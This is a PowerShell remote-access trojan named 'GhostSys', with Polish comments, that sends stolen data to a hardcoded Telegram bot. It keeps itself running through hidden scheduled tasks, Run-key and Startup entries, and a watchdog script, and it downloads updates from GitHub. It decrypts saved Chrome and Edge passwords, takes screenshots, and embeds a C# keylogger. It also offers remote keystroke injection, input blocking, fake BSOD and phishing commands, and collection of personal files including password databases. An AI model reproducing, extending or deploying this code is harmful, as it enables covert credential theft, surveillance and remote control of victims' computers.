param([switch]$poll)
$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
$tok='9213324981:AAG-back1py2J5fsGXfIATEJMa2M625xBD0'
$cid='9185389635'
$api="https://api.telegram.org/bot$tok"
$base='https://github.com/ecomlyceo-dotcom/ghost/raw/refs/heads/main'
$dir="$env:APPDATA\Microsoft\Windows"
$me="$dir\GhostSys.ps1"
$guard="$dir\GhostGuard.ps1"; $stop="$dir\GhostSys.stop"
$hb="$dir\GhostSys.hb"; $pidf="$dir\GhostSys.pid"
$klf="$dir\kl.log"; $klcs="$dir\kl.cs"; $kloff="$dir\kl.off"; $klpid="$dir\kl.pid"
$cwd=$env:USERPROFILE
$ver='v5'

$mtx=New-Object Threading.Mutex($false,'Global\GhostSys01')
$got=$true
try{ $got=$mtx.WaitOne(0) }catch{ $got=$true }
if(-not $got){ exit }
$PID | Out-File $pidf -Encoding ascii

# ================= transport =================
function Snd($sb){ try{ & $sb }catch{ Start-Sleep -Milliseconds 800; try{ & $sb }catch{} } }
function T($m){ $m=[string]$m; if($m.Length -gt 3900){ $m=$m.Substring(0,3900) }; Snd { Invoke-RestMethod "$api/sendMessage" -Method Post -Body @{chat_id=$cid;text=$m} -TimeoutSec 15 | Out-Null } }
function TD($f){ if((Test-Path $f) -and ((Get-Item $f).Length -gt 0)){ Snd { curl.exe -s --max-time 40 -F "chat_id=$cid" --form-string "document=@$f" "$api/sendDocument" | Out-Null }; Start-Sleep -Milliseconds 350 } }
function TP($f,$cap){ if(Test-Path $f){ Snd { curl.exe -s --max-time 30 -F "chat_id=$cid" -F "photo=@$f" --form-string "caption=$cap" "$api/sendPhoto" | Out-Null }; Start-Sleep -Milliseconds 350 } }
function Grab($src,$dst){ try{ $fs=[IO.File]::Open($src,'Open','Read','ReadWrite'); $o=[IO.File]::Create($dst); $fs.CopyTo($o); $o.Flush(); $o.Close(); $fs.Close() }catch{ try{ $o.Close() }catch{}; try{ $fs.Close() }catch{} } }
function Big($o){ $o=[string]$o; if($o.Length -gt 3500){ $o | Out-File "$env:TEMP\o.txt" -Encoding utf8; TD "$env:TEMP\o.txt" } else { T $o } }
function Beat(){ (Get-Date).ToString('s') | Out-File $hb -Encoding ascii }

# ================= ekran =================
function SS($p){ try{
  Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing
  $b=[System.Windows.Forms.SystemInformation]::VirtualScreen
  $s=1.0; if($b.Width -gt 1920){ $s=1920/[double]$b.Width }
  $w=[int]($b.Width*$s); $h=[int]($b.Height*$s)
  $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height
  $g=[System.Drawing.Graphics]::FromImage($bmp)
  $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size)
  $out=New-Object System.Drawing.Bitmap $w,$h
  $g2=[System.Drawing.Graphics]::FromImage($out)
  $g2.InterpolationMode=[System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
  $g2.DrawImage($bmp,0,0,$w,$h)
  $enc=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
  $ep=New-Object System.Drawing.Imaging.EncoderParameters 1
  $ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality),60
  $out.Save($p,$enc,$ep)
  $g.Dispose(); $g2.Dispose(); $bmp.Dispose(); $out.Dispose(); return $true
}catch{ return $false } }

# ================= watchdog =================
function Guard {
@'
$ErrorActionPreference='SilentlyContinue'
$d="$env:APPDATA\Microsoft\Windows"
$me="$d\GhostSys.ps1"; $stop="$d\GhostSys.stop"; $hb="$d\GhostSys.hb"; $pf="$d\GhostSys.pid"
if(Test-Path $stop){ exit }
$m=New-Object Threading.Mutex($false,'Global\GhostSys01')
$got=$true; try{ $got=$m.WaitOne(0) }catch{ $got=$true }
if(-not $got){
  $age=9999
  if(Test-Path $hb){ $age=((Get-Date)-(Get-Item $hb).LastWriteTime).TotalMinutes }
  if($age -lt 3){ exit }
  $p=0; if(Test-Path $pf){ try{ $p=[int]((Get-Content $pf -Raw).Trim()) }catch{} }
  if($p -gt 0){ Stop-Process -Id $p -Force -EA 0; Start-Sleep 1 }
  $got=$true; try{ $got=$m.WaitOne(0) }catch{ $got=$true }
  if(-not $got){ exit }
}
try{ $m.ReleaseMutex() }catch{}
Start-Process powershell -ArgumentList "-sta -nol -w hidden -nop -ep bypass -f `"$me`" -poll" -WindowStyle Hidden
'@ | Out-File $guard -Encoding utf8
}

function Persist {
  $gargs='-w hidden -nop -ep bypass -f "' + $guard + '"'
  $pargs='-w hidden -nop -ep bypass -f "' + $me + '" -poll'
  foreach($p in @('\Microsoft\Windows\WindowsUpdate\GhostSync','\GhostSystem01W')){
    schtasks /create /tn $p /tr ('powershell ' + $gargs) /sc minute /mo 5 /f 2>$null | Out-Null
    if($LASTEXITCODE -eq 0){ schtasks /change /tn $p /ri 5 /du 9999:00 2>$null | Out-Null; break }
  }
  schtasks /create /tn "GhostSystem01" /tr ('powershell ' + $pargs) /sc onlogon /f 2>$null | Out-Null
  if($LASTEXITCODE -ne 0){
    $lnk="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\GhostSystem01.lnk"
    try{ $ws=New-Object -ComObject WScript.Shell; $s=$ws.CreateShortcut($lnk); $s.TargetPath="powershell"; $s.Arguments=$pargs; $s.WindowStyle=7; $s.Save() }catch{}
  }
  try{ Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'GhostSystem01' -Value ('powershell ' + $pargs) -Force }catch{}
}

# ================= przegladarki =================
function Dpapi($b64){ $k=[Convert]::FromBase64String($b64); return [Security.Cryptography.ProtectedData]::Unprotect($k[5..($k.Length-1)],$null,'CurrentUser') }

$gcmsrc=@'
using System; using System.Runtime.InteropServices;
public static class Gcm {
  [StructLayout(LayoutKind.Sequential)]
  struct I { public int cbSize; public int v; public IntPtr n; public int cn; public IntPtr a; public int ca;
             public IntPtr t; public int ct; public IntPtr m; public int cm; public int caad; public long cd; public int f; }
  [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr h, string a, string i, int f);
  [DllImport("bcrypt.dll")] static extern int BCryptSetProperty(IntPtr h, string p, byte[] b, int c, int f);
  [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr h, out IntPtr k, IntPtr o, int co, byte[] s, int cs, int f);
  [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr k, byte[] i, int ci, ref I p, byte[] iv, int civ, byte[] o, int co, out int r, int f);
  [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr k);
  [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr h, int f);
  public static byte[] D(byte[] key, byte[] nonce, byte[] ct, byte[] tag){
    IntPtr h, k;
    if(BCryptOpenAlgorithmProvider(out h,"AES",null,0)!=0) return null;
    byte[] m=System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
    BCryptSetProperty(h,"ChainingMode",m,m.Length,0);
    if(BCryptGenerateSymmetricKey(h,out k,IntPtr.Zero,0,key,key.Length,0)!=0){ BCryptCloseAlgorithmProvider(h,0); return null; }
    var i=new I(); i.cbSize=Marshal.SizeOf(i); i.v=1;
    var hn=GCHandle.Alloc(nonce,GCHandleType.Pinned); var ht=GCHandle.Alloc(tag,GCHandleType.Pinned);
    i.n=hn.AddrOfPinnedObject(); i.cn=nonce.Length; i.t=ht.AddrOfPinnedObject(); i.ct=tag.Length;
    byte[] o=new byte[ct.Length]; int r;
    int s=BCryptDecrypt(k,ct,ct.Length,ref i,null,0,o,o.Length,out r,0);
    hn.Free(); ht.Free(); BCryptDestroyKey(k); BCryptCloseAlgorithmProvider(h,0);
    if(s!=0) return null;
    Array.Resize(ref o,r); return o;
  }
}
'@

function DecryptBlob($buf,$key){
  if($buf.Length -lt 32){ return $null }
  $pre=[Text.Encoding]::ASCII.GetString($buf,0,3)
  if($pre -eq 'v20'){ return '<v20 - pominiete>' }
  if($pre -ne 'v10' -and $pre -ne 'v11'){ return [Text.Encoding]::UTF8.GetString($buf) }
  try{
    $n=$buf[3..14]; $t=$buf[($buf.Length-16)..($buf.Length-1)]; $c=$buf[15..($buf.Length-17)]
    $p=[Gcm]::D($key,$n,$c,$t)
    if($p){ return [Text.Encoding]::UTF8.GetString($p) }
  }catch{}
  return '<nie odszyfrowano>'
}

function DumpPass {
  $out="$env:TEMP\pass.txt"; "=== loginy przegladarek ===" | Out-File $out -Encoding utf8
  Add-Type -TypeDefinition $gcmsrc 2>$null
  $map=@(@('Chrome',"$env:LOCALAPPDATA\Google\Chrome\User Data"),@('Edge',"$env:LOCALAPPDATA\Microsoft\Edge\User Data"))
  foreach($b in $map){
    $ud=$b[1]; if(-not (Test-Path $ud)){ continue }
    $key=$null
    if(Test-Path "$ud\Local State"){ try{ $ls=Get-Content "$ud\Local State" -Raw | ConvertFrom-Json; $key=Dpapi $ls.os_crypt.encrypted_key }catch{} }
    "--- $($b[0]) ---" | Out-File $out -Append -Encoding utf8
    foreach($prof in (Get-ChildItem $ud -Directory -EA 0 | Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' })){
      $ld=Join-Path $prof.FullName 'Login Data'
      if(-not (Test-Path $ld)){ continue }
      $cp="$env:TEMP\ld.db"; Remove-Item "$cp*" -Force -EA 0
      Grab $ld $cp
      foreach($x in @('-wal','-shm')){ if(Test-Path ($ld+$x)){ Grab ($ld+$x) ($cp+$x) } }
      "$($prof.Name)" | Out-File $out -Append -Encoding utf8
      $pyc=(Get-Command python -EA 0).Source
      if($key -and $pyc){
        try{
          $py=@"
import sqlite3,sys
try:
 c=sqlite3.connect(sys.argv[1])
 for r in c.execute('select origin_url,username_value,password_value from logins'):
  sys.stdout.write(r[0]+'\t'+r[1]+'\t'+r[2].hex()+'\n')
except Exception as e: print('ERR',e)
"@
          $pf="$env:TEMP\ld.py"; $py | Out-File $pf -Encoding ascii
          foreach($r in (& $pyc $pf $cp 2>$null)){
            if($r -match '^ERR'){ "  $r" | Out-File $out -Append -Encoding utf8; continue }
            $f=$r -split "`t"; $pw=''
            if($f.Length -ge 3 -and $f[2]){
              $bb=[byte[]]::new($f[2].Length/2)
              for($i=0;$i -lt $bb.Length;$i++){ $bb[$i]=[Convert]::ToByte($f[2].Substring($i*2,2),16) }
              $pw=DecryptBlob $bb $key
            }
            "  $($f[0]) | $($f[1]) | $pw" | Out-File $out -Append -Encoding utf8
          }
        }catch{ "  blad odczytu" | Out-File $out -Append -Encoding utf8 }
      } elseif(-not $key){ "  brak klucza (Local State)" | Out-File $out -Append -Encoding utf8 }
      else { "  brak pythona - surowa baza w zipie" | Out-File $out -Append -Encoding utf8 }
    }
  }
  "--- Firefox (offline: logins.json + key4.db) ---" | Out-File $out -Append -Encoding utf8
  foreach($ff in (Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -EA 0)){
    if(Test-Path "$($ff.FullName)\logins.json"){ "  $($ff.Name)" | Out-File $out -Append -Encoding utf8 }
  }
  TD $out; Remove-Item $out,$env:TEMP\ld.db*,$env:TEMP\ld.py -Force -EA 0
}

# ================= HID / fun =================
if(-not ('H' -as [type])){
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class H {
  [DllImport("user32.dll")] public static extern bool BlockInput(bool f);
  [DllImport("user32.dll")] public static extern void keybd_event(byte b,byte s,int f,int e);
  [DllImport("user32.dll")] public static extern void mouse_event(int f,int x,int y,int d,int e);
  [DllImport("user32.dll")] public static extern bool SetCursorPos(int x,int y);
  [DllImport("user32.dll")] public static extern bool SystemParametersInfo(int a,int b,string c,int d);
}
'@ 2>$null
}
Add-Type -AssemblyName System.Windows.Forms 2>$null

function Spawn($code,$ar){
  $f="$env:TEMP\gx$((Get-Random -Max 99999)).ps1"
  $code | Out-File $f -Encoding utf8
  Start-Process powershell -ArgumentList "-sta -w hidden -nop -ep bypass -f `"$f`" $ar" -WindowStyle Hidden
}
function Kb($vk){ [H]::keybd_event([byte]$vk,0,0,0); [H]::keybd_event([byte]$vk,0,2,0); Start-Sleep -Milliseconds 60 }
function Combo($mod,$vk){ [H]::keybd_event([byte]$mod,0,0,0); [H]::keybd_event([byte]$vk,0,0,0); [H]::keybd_event([byte]$vk,0,2,0); [H]::keybd_event([byte]$mod,0,2,0); Start-Sleep -Milliseconds 80 }

function Duck($sc){
  $sp=@{ENTER=13;TAB=9;ESC=27;BACKSPACE=8;DELETE=46;UP=38;DOWN=40;LEFT=37;RIGHT=39;HOME=36;END=35;PAGEUP=33;PAGEDOWN=34;SPACE=32;MENU=93}
  1..12 | ForEach-Object { $sp["F$_"]=111+$_ }
  foreach($line in ($sc -split "`r?`n")){
    $l=$line.Trim(); if(-not $l -or $l -match '^REM'){ continue }
    $p=$l -split ' ',2; $cmd=$p[0].ToUpper(); $arg=''; if($p.Count -gt 1){ $arg=$p[1] }
    if($cmd -eq 'STRING'){ [System.Windows.Forms.SendKeys]::SendWait(($arg -replace '([+^%~(){}])','{$1}')); continue }
    if($cmd -eq 'DELAY'){ Start-Sleep -Milliseconds ([int]$arg); continue }
    if($cmd -eq 'GUI'){ if($arg.Length -eq 1){ Combo 0x5B ([int][char]$arg.ToUpper()) } else { Kb 0x5B }; continue }
    if($cmd -eq 'CTRL'){ if($arg.Length -eq 1){ Combo 0x11 ([int][char]$arg.ToUpper()) }; continue }
    if($cmd -eq 'ALT'){ if($arg.Length -eq 1){ Combo 0x12 ([int][char]$arg.ToUpper()) }; continue }
    if($cmd -eq 'SHIFT'){ if($arg.Length -eq 1){ Combo 0x10 ([int][char]$arg.ToUpper()) }; continue }
    if($sp.ContainsKey($cmd)){ Kb $sp[$cmd]; continue }
    if($cmd.Length -eq 1){ Kb ([int][char]$cmd.ToUpper()) }
  }
}

function Toast($ti,$tx){
  try{
    [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime] | Out-Null
    $t=[Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
    $e=$t.GetElementsByTagName('text')
    $e.Item(0).AppendChild($t.CreateTextNode($ti)) | Out-Null
    $e.Item(1).AppendChild($t.CreateTextNode($tx)) | Out-Null
    [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Ghost').Show([Windows.UI.Notifications.ToastNotification]::new($t))
    return $true
  }catch{ return $false }
}

function Scan($h,$ports){
  $r=@()
  foreach($p in $ports){
    try{ $c=New-Object Net.Sockets.TcpClient; $t=$c.ConnectAsync($h,$p); if($t.Wait(600) -and $c.Connected){ $r+=$p }; $c.Close() }catch{}
  }
  $r
}
function Wol($mac){
  $m=[byte[]]($mac -split '[:.-]' | ForEach-Object { [Convert]::ToByte($_,16) })
  $b=[byte[]]::new(102); for($i=0;$i -lt 6;$i++){ $b[$i]=255 }
  for($i=1;$i -le 16;$i++){ [Array]::Copy($m,0,$b,($i*6),6) }
  $u=New-Object Net.Sockets.UdpClient; $u.Connect((New-Object Net.IPEndPoint([Net.IPAddress]::Broadcast,9))); $u.Send($b,$b.Length) | Out-Null; $u.Close()
}
function Full($tpl,$ar){
  $f="$env:TEMP\gx$(Get-Random -Max 9999).ps1"
  $tpl | Out-File $f -Encoding utf8
  Start-Process powershell -ArgumentList "-sta -w hidden -nop -ep bypass -f `"$f`" $ar" -WindowStyle Hidden
}

# ================= keylogger =================
$klsrc=@'
using System; using System.IO; using System.Runtime.InteropServices; using System.Text; using System.Threading;
public class KeyLog {
  delegate IntPtr HookProc(int n, IntPtr w, IntPtr l);
  [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr h; public uint m; public IntPtr w; public IntPtr l; public uint t; public int x; public int y; }
  [StructLayout(LayoutKind.Sequential)] struct KH { public uint vk; public uint sc; public uint f; public uint t; public IntPtr e; }
  [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int i, HookProc p, IntPtr m, uint t);
  [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
  [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
  [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr h, uint a, uint b);
  [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
  [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
  [DllImport("user32.dll")] static extern bool PostThreadMessage(uint t, uint m, IntPtr w, IntPtr l);
  [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
  [DllImport("user32.dll", CharSet=CharSet.Unicode)] static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
  [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr h, out uint p);
  [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint t);
  [DllImport("user32.dll")] static extern bool GetKeyboardState(byte[] k);
  [DllImport("user32.dll")] static extern int ToUnicodeEx(uint v, uint s, byte[] k, StringBuilder b, int n, uint f, IntPtr l);
  static HookProc pr; static IntPtr hk; static uint tid; static string pth; static string lw="";
  public static void Start(string p){ pth=p; var t=new Thread(Run); t.SetApartmentState(ApartmentState.STA); t.IsBackground=true; t.Start(); }
  static void W(string s){ try{ File.AppendAllText(pth,s); }catch{} }
  static void Run(){
    tid=GetCurrentThreadId(); pr=new HookProc(Cb);
    hk=SetWindowsHookEx(13,pr,GetModuleHandle(null),0);
    if(hk==IntPtr.Zero){ W("[hook fail]\n"); return; }
    MSG m; while(GetMessage(out m,IntPtr.Zero,0,0)>0){ TranslateMessage(ref m); DispatchMessage(ref m); }
    UnhookWindowsHookEx(hk);
  }
  public static void Stop(){ PostThreadMessage(tid,0x0012,IntPtr.Zero,IntPtr.Zero); }
  static IntPtr Cb(int n, IntPtr w, IntPtr l){
    if(n<0) return CallNextHookEx(hk,n,w,l);
    int msg=w.ToInt32();
    if(msg==0x100||msg==0x104){
      try{
        var k=(KH)Marshal.PtrToStructure(l,typeof(KH));
        if(k.vk==16||k.vk==17||k.vk==18||k.vk==91||k.vk==92||k.vk==160||k.vk==161||k.vk==162||k.vk==163||k.vk==164||k.vk==165) return CallNextHookEx(hk,n,w,l);
        var hw=GetForegroundWindow(); var sb=new StringBuilder(256); GetWindowText(hw,sb,256);
        string wn=sb.ToString();
        if(wn!=lw&&wn.Length>0){ lw=wn; W("\n["+DateTime.Now.ToString("HH:mm:ss")+"] == "+wn+" ==\n"); }
        uint pid; uint ft=GetWindowThreadProcessId(hw,out pid);
        var ks=new byte[256]; GetKeyboardState(ks);
        var b=new StringBuilder(8);
        int r=ToUnicodeEx(k.vk,k.sc,ks,b,8,0,GetKeyboardLayout(ft));
        string o="";
        if(r>0&&b.Length>0){ o=b.ToString(); }
        else{
          switch(k.vk){
            case 13: o="{ENTER}\n"; break; case 9: o="{TAB}"; break; case 8: o="{BACK}"; break;
            case 27: o="{ESC}"; break; case 46: o="{DEL}"; break; case 32: o=" "; break;
            case 36: o="{HOME}"; break; case 35: o="{END}"; break; case 33: o="{PGUP}"; break; case 34: o="{PGDN}"; break;
            case 37: o="{LEFT}"; break; case 38: o="{UP}"; break; case 39: o="{RIGHT}"; break; case 40: o="{DOWN}"; break;
            default: if(k.vk>=112&&k.vk<=123){ o="{F"+(k.vk-111)+"}"; } break;
          }
        }
        if(o.Length>0) W(o);
      }catch{}
    }
    return CallNextHookEx(hk,n,w,l);
  }
}
'@

# ================= tabela prostych komend =================
$simple=@{
 'env'={ Get-ChildItem env: | Sort-Object Name | Out-String }
 'arp'={ arp -a | Out-String }
 'net'={ netstat -ano | Out-String }
 'route'={ route print | Out-String }
 'share'={ net share | Out-String }
 'dns'={ if($a){ Resolve-DnsName $a -EA 0 | Out-String } }
 'ping'={ if($a){ Test-Connection $a -Count 4 | Out-String } }
 'trace'={ if($a){ tracert -h 12 -w 800 $a | Out-String } }
 'hosts'={ Get-Content "$env:SystemRoot\System32\drivers\etc\hosts" -EA 0 | Out-String }
 'mac'={ Get-NetAdapter -EA 0 | Select-Object Name,MacAddress,LinkSpeed,Status | Format-Table -Auto | Out-String }
 'drives'={ Get-Volume -EA 0 | Format-Table -Auto | Out-String }
 'disk'={ Get-PhysicalDisk -EA 0 | Format-Table -Auto | Out-String }
 'cpu'={ Get-CimInstance Win32_Processor | Select-Object Name,LoadPercentage,NumberOfCores | Format-List | Out-String }
 'gpu'={ Get-CimInstance Win32_VideoController | Select-Object Name,DriverVersion,VideoModeDescription | Format-List | Out-String }
 'ram'={ Get-CimInstance Win32_PhysicalMemory | Select-Object BankLabel,Capacity,Speed,Manufacturer | Format-Table -Auto | Out-String }
 'batt'={ Get-CimInstance Win32_Battery | Format-List | Out-String }
 'uptime'={ $b=(Get-CimInstance Win32_OperatingSystem).LastBootUpTime; "boot: $b / uptime: $((Get-Date)-$b)" }
 'who'={ whoami /all | Out-String }
 'priv'={ whoami /priv | Out-String }
 'groups'={ whoami /groups | Out-String }
 'time'={ Get-Date -Format 'yyyy-MM-dd HH:mm:ss zzz' }
 'tz'={ Get-TimeZone | Out-String }
 'lang'={ Get-WinSystemLocale | Out-String }
 'res'={ Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { "$($_.DeviceName) $($_.Bounds.Width)x$($_.Bounds.Height)" } }
 'audio'={ Get-CimInstance Win32_SoundDevice | Select-Object Name,Status | Format-Table -Auto | Out-String }
 'printers'={ Get-Printer -EA 0 | Format-Table Name,DriverName,PortName -Auto | Out-String }
 'usb'={ Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR' -EA 0 | ForEach-Object { (Get-ItemProperty $_.PSPath).FriendlyName } }
 'bt'={ Get-PnpDevice -Class Bluetooth -EA 0 | Format-Table FriendlyName,Status -Auto | Out-String }
 'fw'={ Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table -Auto | Out-String }
 'av'={ Get-MpComputerStatus -EA 0 | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated | Format-List | Out-String }
 'installed'={ Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA 0 | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -Auto | Out-String }
 'startup'={ Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run','HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA 0 | Format-List; Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -EA 0 | Select-Object Name }
 'tasks'={ Get-ScheduledTask -EA 0 | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | Select-Object TaskName,TaskPath,State | Format-Table -Auto | Out-String }
 'updates'={ Get-HotFix -EA 0 | Sort-Object InstalledOn -Descending | Select-Object -First 12 HotFixID,InstalledOn | Format-Table -Auto | Out-String }
 'windows'={ Get-Process -EA 0 | Where-Object { $_.MainWindowTitle } | Select-Object Id,ProcessName,MainWindowTitle | Format-Table -Auto | Out-String }
 'cursor'={ Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position }
 'recent'={ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA 0 | Sort-Object LastWriteTime -Desc | Select-Object -First 40 Name,LastWriteTime | Format-Table -Auto | Out-String }
 'downloads'={ Get-ChildItem "$env:USERPROFILE\Downloads" -EA 0 | Sort-Object LastWriteTime -Desc | Select-Object -First 40 Name,Length,LastWriteTime | Format-Table -Auto | Out-String }
 'hash'={ if($a){ (Get-FileHash $a -Algorithm SHA256).Hash } }
 'size'={ if($a){ "{0:N1} MB" -f ((Get-ChildItem $a -Recurse -File -EA 0 | Measure-Object Length -Sum).Sum/1MB) } }
 'find'={ if($a){ Get-ChildItem $env:USERPROFILE -Recurse -Filter $a -EA 0 | Select-Object -First 60 FullName,Length | Format-Table -Auto | Out-String } }
 'grep'={ if($a){ $p=$a -split ' ',2; if($p.Count -eq 2){ Select-String -Path $p[1] -Pattern $p[0] -EA 0 | Select-Object -First 80 | Out-String } } }
 'head'={ if($a){ $p=$a -split ' ',2; $n=20; if($p.Count -eq 2){ $n=[int]$p[0]; $a=$p[1] }; Get-Content $a -TotalCount $n -EA 0 | Out-String } }
 'tail'={ if($a){ $p=$a -split ' ',2; $n=20; if($p.Count -eq 2){ $n=[int]$p[0]; $a=$p[1] }; Get-Content $a -Tail $n -EA 0 | Out-String } }
 'tree'={ if($a){ tree /f /a $a | Out-String } }
 'del'={ if($a){ Remove-Item $a -Recurse -Force -EA 0; "usunieto: $a" } }
 'ren'={ if($a){ $p=$a -split '\s+',2; Rename-Item $p[0] $p[1]; "zmieniono: $($p[0]) -> $($p[1])" } }
 'mkdir'={ if($a){ New-Item -ItemType Directory $a -Force | Out-Null; "utworzono: $a" } }
 'b64'={ if($a){ [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($a)) } }
 'unb64'={ if($a){ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a)) } }
 'curl'={ if($a){ (iwr -useb $a -TimeoutSec 25).Content } }
 'hdr'={ if($a){ (iwr -useb $a -Method Head -TimeoutSec 20).Headers.GetEnumerator() | Out-String } }
 'open'={ if($a){ Start-Process $a; "otwarto" } }
 'note'={ if($a){ $a | Out-File "$dir\notes.txt" -Append -Encoding utf8; "zapisano" } }
 'notes'={ Get-Content "$dir\notes.txt" -EA 0 | Out-String }
 'click'={ if($a){ $p=$a -split '\s+'; [H]::SetCursorPos([int]$p[0],[int]$p[1]); [H]::mouse_event(2,0,0,0,0); [H]::mouse_event(4,0,0,0,0); "klik $a" } }
 'move'={ if($a){ $p=$a -split '\s+'; [H]::SetCursorPos([int]$p[0],[int]$p[1]); "kursor $a" } }
 'rclick'={ [H]::mouse_event(8,0,0,0,0); [H]::mouse_event(16,0,0,0,0); "rclick" }
 'scroll'={ if($a){ [H]::mouse_event(0x800,0,0,[int]$a,0); "scroll $a" } }
 'type'={ if($a){ [System.Windows.Forms.SendKeys]::SendWait(($a -replace '([+^%~(){}])','{$1}')); "wpisane" } }
 'enter'={ Kb 13; "enter" }
 'esc'={ Kb 27; "esc" }
 'tab'={ Kb 9; "tab" }
 'copy'={ Combo 0x11 67; "ctrl+c" }
 'paste'={ Combo 0x11 86; "ctrl+v" }
 'selall'={ Combo 0x11 65; "ctrl+a" }
 'undo'={ Combo 0x11 90; "ctrl+z" }
 'save'={ Combo 0x11 83; "ctrl+s" }
 'alttab'={ Combo 0x12 9; "alt+tab" }
 'close'={ Combo 0x12 115; "alt+f4" }
 'clipset'={ if($a){ Set-Clipboard -Value $a; "clipboard ustawiony" } }
 'sleep'={ rundll32.exe powrprof.dll,SetSuspendState 0,1,0; "usypiam" }
 'dark'={ $p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize'; $v=(Get-ItemProperty $p -Name AppsUseLightTheme -EA 0).AppsUseLightTheme; Set-ItemProperty $p -Name AppsUseLightTheme -Value ([int](-not $v)); "motyw przelaczony" }
 'focus'={ if($a){ $w=Get-Process -EA 0 | Where-Object { $_.MainWindowTitle -like "*$a*" } | Select-Object -First 1; (New-Object -ComObject WScript.Shell).AppActivate($w.Id); "focus: $($w.MainWindowTitle)" } }
 'killwin'={ if($a){ Get-Process -EA 0 | Where-Object { $_.MainWindowTitle -like "*$a*" } | Stop-Process -Force -EA 0; "zamknieto: $a" } }
}

function Menu(){ T ("MENU $ver`n!ping !ss !sys !ip !wifi !pass !ps !users !clip !lock`n!ls !cd !get !put !upload !run !kill !msg`n!reboot !shutdown !off !on !uninstall`n`n== flip ==`n!flip !duck !duckdemo !wiggle !wol !scan !ble !toast`n!bsod !update !matrix !qr !phish !vol !brt !wall !tts !beep !block !lock2`n`n== szpieg ==`n!keylog on|off|dump|live|clear`n!klcs`n`n== host ==`n!who !priv !groups !av !fw !installed !startup !tasks !updates`n!net !arp !share !dns !ping !trace !mac !drives !disk !cpu !gpu !ram !batt !uptime`n!env !hosts !route !audio !printers !usb !bt !windows !focus !killwin`n!time !tz !lang !res !cursor !recent !downloads`n`n== hdd ==`n!head !tail !grep !find !hash !size !tree !del !ren !mkdir !note !notes`n`n== klawisze ==`n!type !keys !enter !esc !tab !copy !paste !selall !undo !save !alttab !close`n!click !move !rclick !scroll !clipset`n`n== net ==`n!b64 !unb64 !curl !hdr !open !dark !sleep`n`nBez ! = czysty PowerShell.") }

# ================= instalacja =================
if(-not $poll){
New-Item -ItemType Directory $dir -Force | Out-Null
Remove-Item $stop -Force -EA 0
try{ iwr -useb "$base/run.ps1?t=$([int](Get-Date -UFormat %s))" -OutFile $me -UseB -TimeoutSec 20 }catch{ if($PSCommandPath -and $PSCommandPath -ne $me){ Copy-Item $PSCommandPath $me -Force } }
Guard
Persist

$dst="$env:TEMP\g"
Remove-Item $dst -Recurse -Force -EA 0
New-Item -ItemType Directory $dst -Force | Out-Null
$roots=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
$ext='^\.(mp4|mov|avi|mkv|jpg|jpeg|png|pdf|docx|xlsx|txt|zip|kdbx)$'
$sha=[Security.Cryptography.SHA1]::Create()
